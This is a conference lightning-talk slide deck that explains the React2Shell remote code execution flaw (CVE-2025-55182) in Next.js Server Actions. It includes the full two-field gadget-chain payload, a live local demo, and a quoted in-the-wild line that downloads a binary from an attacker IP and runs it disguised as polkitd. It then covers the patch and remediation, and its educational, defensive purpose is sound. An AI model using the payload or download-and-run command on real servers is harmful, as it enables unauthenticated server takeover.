---
title: React2Shell RCE Vulnerability
sub_title:  CVE-2025-55182
event: Vehikl Lightning Talks
date: 02-27-2026
author: Cole Foster
theme:
  name: catppuccin-mocha
options:
  end_slide_shorthand: false
---

Intro
===
# CVE-2025-55182 — **React2Shell**
### Unauthenticated RCE via Next.js Server Actions

```
Affects:   react-server-dom-webpack,           19.0, 19.1.0, 19.1.1, 19.2.0
           react-server-dom-parcel,
           react-server-dom-turbopack
        
           Next.js                             16.0.0 – 16.0.6
            
Vector:    Unauthenticated HTTP POST 
CVSS:      10.0 - Critical
Impact:    Full server-side code execution
```
<!-- alignment: center -->

---

This Presentation:     
Context of how it works     →     Run the exploit locally

<!-- speaker_note: 
 Disclosed to Meta on Dec 3 2025 by Lachlan Davidson.


 CVSS 10 — max severity (common vulnerability scoring system). 

 
 Was seen used  part of this vulnerability is its server side, so digital ocean droplet becomes a crypto mining rig for someone else.
 Affected any Next.js app using App Router with Server Components — which is the default.
-->

<!-- end_slide -->


JS Trick #1: Thenables
===

## Duck-typed Promises

<!-- alignment: center -->

`await` doesn't check `instanceof Promise`.
Any object with a `.then` method is auto-called:

<!-- column_layout: [2, 8, 3, 2] -->

<!-- column: 1 -->

```javascript +exec +id:thenable
/// console.log("\n\n\n\n\n\n\n");
const sneaky = {
  then(resolve) {
    console.log(".then() called!");
    resolve("done");
  }
};

Promise.resolve(sneaky).then(v =>
  console.log("resolved:", v)
);
```

<!-- column: 2 -->

<!-- snippet_output: thenable -->

<!-- reset_layout -->
---
**Control `.then` on an object → control what `await` does.**

<!-- speaker_note: These are called thenables. The JS spec says if the value has a .then that is a function, call it. No instanceof check. The exploit uses this to hijack React's internal await on deserialized chunks. These two primitives — constructor chaining and thenables — are the building blocks. Now let's see what they're used against. -->

<!-- end_slide -->

JS Trick #2: Constructor chaining
===
## Every object leads to `Function`

<!-- speaker_note: The second primitive is constructor chaining. Every object has a .constructor property that points to the class that created it. Every class is a function, so if you access .constructor.constructor you always get Function. This is a well-known JavaScript quirk that has been used in exploits before. In this case, the Flight decoder's reference resolver does unchecked prototype traversal, so an attacker can reach Function from any chunk object. This function constructor takes a string and returns an executable function — it's basically eval. With the thenable trick, we can get the decoder to call it with attacker-controlled input.
-->

Every JavaScript object has a `.constructor` property — the class that created it.
Every class is a function, so its `.constructor` is `Function`.

<!-- column_layout: [1, 8, 3, 4] -->

<!-- column: 1 -->

```javascript +exec +id:constructor_chain
/// console.log("");
const obj = {};
console.log(obj.constructor.name);
console.log(obj.constructor.constructor.name);
console.log(obj.constructor.constructor === Function);
```

<!-- column: 2 -->

<!-- snippet_output: constructor_chain -->

<!-- reset_layout -->


`Function` takes a **string** and returns an executable function:

<!-- column_layout: [1, 8, 3, 4] -->

<!-- column: 1 -->

```javascript +exec +id:function_eval
/// console.log("");
const F = {}.constructor.constructor;
console.log(F("return 1+1")());
console.log(F("return process.version")());
```

<!-- column: 2 -->

<!-- snippet_output: function_eval -->

<!-- reset_layout -->


<!--// alignment: center -->
**Two property hops from any object → dynamic code execution.**

<!-- end_slide -->

Context
===
## Server Actions & the Flight Protocol

```typescript
"use server"
async function submitOrder(item: string, qty: number) {
  await db.insert({ item, qty })
  return { ok: true }
}
```

On submit the browser POSTs to the page URL.
Arguments are serialized in React's **Flight** format:

```
POST /   Next-Action: <sha256-hash>   Content-Type: multipart/form-data

Field "0":  ["$1"]
Field "1":  {"item":"widget","vendor":"$2:vendorName"}
Field "2":  {"vendorName":"Vehikl"}
```

`$`-prefixed strings are cross-chunk references resolved by the decoder.

<!-- speaker_note: Server Actions are functions marked use-server that the browser can call via a POST. The arguments get serialized in React's Flight protocol — numbered multipart chunks that can reference each other with dollar-sign prefixes. The decoder resolves these by walking the referenced chunk and accessing the named key. This is where it breaks. -->

<!-- end_slide -->
Context cont.
===

<!-- speaker_note: The decoder does result equals result-bracket-key in a loop. vendorName is an own property, fine. But constructor is not — it is inherited from the prototype. The decoder does not check, so an attacker can walk the prototype chain. Two hops from any chunk object reaches the Function constructor. Combined with the thenable trick, that is RCE. -->

## Flight — The Bug

The decoder resolves `$2:vendorName` with bracket access — `obj["vendorName"]`.
No check whether the key is an **own property**:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:flight_bug
/// console.log("");
const obj = { vendorName: "Vehikl" };

// Own property — fine
console.log(obj["vendorName"]);

// Inherited — prototype chain
console.log(obj["constructor"].name);
console.log(
  obj["constructor"]["constructor"].name
);
```

<!-- column: 1 -->

<!-- snippet_output: flight_bug -->

<!-- reset_layout -->

`$1:constructor:constructor` → `Function`. **That's the entire bug.**

<!-- speaker_note: The decoder does result equals result-bracket-key in a loop. vendorName is an own property, fine. But constructor is not — it is inherited from the prototype. The decoder does not check, so an attacker can walk the prototype chain. Two hops from any chunk object reaches the Function constructor. Combined with the thenable trick, that is RCE. -->

<!-- end_slide -->

The Gadget Chain
===
## The Payload

Two multipart fields. No custom classes, no memory corruption.

```json
Field "0": {
  "then":      "$1:__proto__:then",
  "status":    "resolved_model",
  "reason":    -1,
  "value":     "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix":   "<COMMAND>;//",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}

Field "1": "$@0"
```

Runs on **any route**, before auth, middleware, or action ID validation.
`Next-Action: x` (any value) is enough to trigger deserialization.

<!-- speaker_note: This is the complete exploit payload. Two form fields. Field 1 is just a self-reference back to field 0 — gives the decoder a real object to traverse. Field 0 mimics React's internal Chunk structure with attacker-controlled fields. Every key in this object serves a specific purpose in the chain. Let us walk through it. -->

<!-- end_slide -->
The Gadget Chain: Explained 
===
## Steps 1 & 2 — Thenable + initialization

`"then": "$1:__proto__:then"` — steals `Chunk.prototype.then`

Chunk 0 becomes a thenable → `await` calls `.then()` automatically.

<!-- // pause -->

`"status": "resolved_model"` — triggers chunk initialization

```javascript
// Inside Chunk.prototype.then (simplified):
if (this.status === "resolved_model") {
  initializeModelChunk(this);
  //                   ^^^^  — this is our fake chunk
}
```

`initializeModelChunk` reads `this._response` — normally trusted.
Here it's attacker-controlled.

<!-- speaker_note: Step 1 — the decoder resolves the then reference by walking chunk 1's prototype to find Chunk.prototype.then — the real internal method. Now our object is a thenable, so when the decoder awaits the deserialized result, JS auto-calls .then(). Step 2 — inside .then(), it checks this.status. We set it to resolved_model so it calls initializeModelChunk on our object. That function reads this._response to do further parsing — and we control _response entirely. -->

<!-- end_slide -->

The Gadget Chain: Explained cont.
===

<!-- speaker_note: Step 3 — the decoder resolves dollar-1-constructor-constructor — two hops up the prototype chain to Function. That gets assigned to _formData.get. Step 4 — the inner value has $B0 which triggers React's Blob handler. It calls response._formData.get(response._prefix + id). With our substitutions that becomes Function(malicious_code + 0). The double-slash comments out the trailing 0. Function returns an executable, it runs, and we have shell access. On a real server the prefix would be process.mainModule.require child_process execSync. -->

## Steps 3 & 4 — `Function` + execution

`"_formData": { "get": "$1:constructor:constructor" }` replaces `.get` with `Function`:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:step3
/// console.log("");
const obj = {};
let result = obj;
result = result["constructor"];
result = result["constructor"];
console.log(result.name);
console.log(result === Function);
```

<!-- column: 1 -->

<!-- snippet_output: step3 -->

<!-- reset_layout -->

`"value": "{\"then\":\"$B0\"}"` triggers the `$B` (Blob) handler:

```javascript
// Blob handler calls:
response._formData.get(response._prefix + id)
// Which is now:
Function("<COMMAND>;//" + "0")  // → executable function
```

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:step4
/// console.log("");
const fn = Function("console.log('RCE!');//" + "0");
fn();
```

<!-- column: 1 -->

<!-- snippet_output: step4 -->

<!-- reset_layout -->

<!-- end_slide -->

Live Demo — Setup
===
## Demo Target — Stock Next.js App

```bash
npx create-next-app@16.0.6 demo --yes
cd demo
npm run dev
```

A completely default Next.js app. No custom code, no server actions defined.

The App Router enables Server Components by default.

<!-- speaker_note: This is a bone-stock Next.js app.create-next-app with the default template, no modifications. No server actions defined, no custom API routes, nothing. The App Router is enabled by default and that is all the exploit needs. npm run dev, listening on port 3000. -->

<!-- end_slide -->

Live Demo
===
## Live — RCE

```bash +exec
cat exploit-2-rce.hurl
```

```bash +exec
hurl --variable host="http://localhost:3000" \
     --max-time 10 \
     --no-color \
     exploit-2-rce.hurl 2>&1
```

```bash +exec
cat /tmp/pwned.txt
```

<!-- speaker_note: Here is the actual exploit against our stock Next.js app. The hurl file sends our two-field payload. The server returns a 500 because the action ID is invalid — but that check happens AFTER deserialization. The command already ran. Let us read the file. There it is — the output of id, written by the Next.js server process. One unauthenticated POST to a default app.  -->

REAL RCE:
wget http://45.76.155[.]14/vim -O /tmp/vim

/tmp/vim "/usr/lib/polkit-1/polkitd --no-debug"

<!-- end_slide -->

The Patch
===
## The Fix — Three changes

**1. Own-property check on traversal**

```javascript
// BEFORE                          // AFTER
obj = obj[path[i]];               if (!hasOwnProperty.call(obj, path[i]))
                                     throw new Error("Invalid reference");
                                   obj = obj[path[i]];
```

<!-- // pause -->

**2. Symbol-based response lookup**

```javascript
// BEFORE                          // AFTER
reviveModel(chunk._response, ...)  chunk.reason[Symbol("response")]
```

Symbols can't exist in JSON — fake chunks can never provide a fake `_response`.

<!-- // pause -->

**3. Type validation on `.then` listeners**

Any single fix breaks the chain. The patch applied all three.

<!-- speaker_note: Three independent fixes. First — the reference resolver now checks hasOwnProperty before each bracket access. Constructor is not an own property, so the traversal throws. Second — initializeModelChunk now looks up the response via a Symbol instead of reading _response directly. Symbols cannot be represented in JSON, so an attacker can never forge one. Third — type checks on the then listeners. Any one of these alone would have stopped the exploit. Defense in depth. -->

<!-- end_slide -->

Summary
===

<!-- speaker_note: To summarize — this was a critical RCE in Next.js and React, CVE-2025-55182, with a CVSS score of 10. It required just one unauthenticated POST request to any route, with no knowledge of the app. The exploit used two JavaScript features — thenables and constructor chaining — to achieve code execution during deserialization. The patch added three independent mitigations to break the chain. If you're running affected versions, upgrade immediately. Questions?  Patch your Next.js and React apps. Questions? -->

## Summary

**1 request. No auth. No account. No knowledge of the target app.**

```
obj[key]                           walks prototype chain unchecked
obj.constructor.constructor        always reaches Function
Function(string)                   eval with no imports or setup
await { then: fn }                 auto-calls .then() (duck-typed)
```

**Remediation**

- Upgrade to **Next.js ≥ 16.0.7** / **React ≥ 19.0.1, 19.1.2, 19.2.1**
- WAF: block `__proto__` and `constructor:constructor` in POST bodies
- Runtime: deny `process.mainModule` access in server action context


<!-- speaker_note:  -->
